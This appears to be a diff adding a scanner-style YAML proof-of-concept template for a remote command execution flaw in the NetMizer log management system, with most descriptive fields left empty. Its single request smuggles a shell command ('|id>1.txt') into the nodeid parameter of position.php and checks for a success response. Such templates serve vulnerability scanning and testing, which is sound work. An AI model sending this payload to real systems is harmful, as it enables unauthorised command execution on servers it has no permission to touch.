@@ -1,0 +1,16 @@
+id:
+info:
+  name: NetMizer日志管理系统前台RCE漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /data/search/position.php?action=file&nodeid=|id>1.txt
+response1:
+  headers:
+  body: success
+  code: 200
+requests2:
+response2:
